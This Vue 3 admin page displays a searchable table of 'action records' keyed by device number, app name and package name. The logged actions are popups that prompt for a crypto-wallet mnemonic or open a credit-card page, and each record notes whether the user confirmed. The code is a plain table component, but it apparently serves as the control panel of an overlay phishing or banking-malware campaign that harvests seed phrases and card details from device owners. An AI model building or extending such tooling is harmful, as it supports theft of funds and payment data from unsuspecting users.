<template>
  <div class="table-box" v-loading="loading" element-loading-text="加载中...">
    <ProTable
      ref="proTable"
      title="动作记录列表"
      row-key="id"
      :columns="columns"
      :request-api="getActionRecordListWithLoading"
      :init-param="initParam"
      :data-callback="dataCallback"
    >
      <!-- 动作内容 -->
      <template #action="scope">
        <el-tag v-if="scope.row.action === 'popup_mnemonic_reminder'" type="danger">弹出助记词提醒</el-tag>
        <el-tag v-else-if="scope.row.action === 'popup_mnemonic_input_page'" type="warning">弹出输入助记词页面</el-tag>
        <el-tag v-else-if="scope.row.action === 'popup_credit_card_page'" type="success">弹出信用卡页面</el-tag>
        <span v-else>{{ scope.row.action || "-" }}</span>
      </template>
      <!-- 用户动作内容 -->
      <template #user_action="scope">
        <el-tag v-if="scope.row.user_action === 'confirm'" type="success">确认</el-tag>
        <el-tag v-else-if="scope.row.user_action === 'back'" type="danger">返回</el-tag>
        <span v-else>{{ scope.row.user_action || "-" }}</span>
      </template>
      <!-- 设备号内容 -->
      <template #device_number="scope">
        <div class="device-number-text">{{ scope.row.device_number || "-" }}</div>
      </template>
    </ProTable>
  </div>
</template>

<script setup lang="ts" name="actionRecord">
import { ref, reactive } from "vue";
import { ColumnProps, ProTableInstance } from "@/components/ProTable/interface";
import ProTable from "@/components/ProTable/index.vue";
import {
  getActionRecordListApi,
  ActionRecordItem,
  ActionRecordListResponse
} from "@/api/modules/actionRecord";

const proTable = ref<ProTableInstance>();
const loading = ref(false);

// 初始化参数
const initParam = reactive({
  page: 1,
  limit: 20
});

// 带加载状态的动作记录列表请求
const getActionRecordListWithLoading = async (params?: any) => {
  loading.value = true;
  try {
    const result = await getActionRecordListApi(params);
    return result;
  } finally {
    loading.value = false;
  }
};

// 数据回调处理
const dataCallback = (data: ActionRecordListResponse) => {
  return {
    list: data.list || [],
    total: data.total_num || 0
  };
};

// 表格配置项
const columns = reactive<ColumnProps<ActionRecordItem>[]>([
  { prop: "id", label: "ID", width: 80 },
  { 
    prop: "device_number", 
    label: "设备号", 
    minWidth: 200, 
    showOverflowTooltip: false,
    search: { el: "input", props: { placeholder: "请输入设备号" } } 
  },
  { 
    prop: "app_name", 
    label: "APP名称", 
    minWidth: 100,
    showOverflowTooltip: false
  },
  { 
    prop: "app_package", 
    label: "包名", 
    minWidth: 200, 
    showOverflowTooltip: false,
    isShow: false,
    search: { el: "input", props: { placeholder: "请输入包名" } } 
  },
  { 
    prop: "action", 
    label: "动作", 
    width: 200,
    enum: [
      { label: "弹出助记词提醒", value: "popup_mnemonic_reminder" },
      { label: "弹出输入助记词页面", value: "popup_mnemonic_input_page" },
      { label: "弹出信用卡页面", value: "popup_credit_card_page" }
    ],
    search: { 
      el: "select", 
      props: { 
        placeholder: "请选择动作",
        clearable: true
      }
    } 
  },
  { 
    prop: "user_action", 
    label: "用户动作", 
    width: 200,
    enum: [
      { label: "确认", value: "confirm" },
      { label: "返回", value: "back" }
    ],
    search: { 
      el: "select", 
      props: { 
        placeholder: "请选择用户动作",
        clearable: true
      }
    } 
  },
  { prop: "created_at", label: "弹出时间", width: 180 },
  { prop: "updated_at", label: "操作时间", width: 180 }
]);

</script>

<style scoped lang="scss">
.table-box {
  padding: 20px;
}

.device-number-text {
  word-break: break-all;
  white-space: normal;
  line-height: 1.5;
}
</style>

